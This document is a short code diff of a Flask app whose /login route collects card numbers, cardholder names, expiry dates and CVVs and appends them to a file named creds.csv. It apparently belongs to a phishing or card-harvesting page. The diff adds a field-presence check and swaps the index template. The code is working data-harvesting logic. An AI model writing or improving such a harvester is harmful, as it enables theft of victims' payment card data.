@@ -5,7 +5,7 @@ app = Flask(__name__)
 
 @app.route("/")
 def index():
-    return render_template("/login.html")
+  return render_template("/index.html")
 
 @app.route("/login", methods=["POST"])
 def login():
@@ -13,14 +13,11 @@ def login():
   name = request.json.get("name")
   expiry = request.json.get("expiry")
   cvv = request.json.get("cvv")
-
-  with open("creds.csv", "a+") as f:
-    csv_writer = csv.writer(f)
-    csv_writer.writerow([card_number, name, expiry, cvv])
-
-  return jsonify({
-    "status": "success"
-  }), 201
+  if card_number and name and expiry and cvv:
+    with open("creds.csv", "a+") as f:
+      csv_writer = csv.writer(f)
+      csv_writer.writerow([card_number, name, expiry, cvv])
+      return jsonify({ "status": "success" }), 201
 
 if __name__ == "__main__":
-    app.run(debug = True)
+  app.run(debug = True)
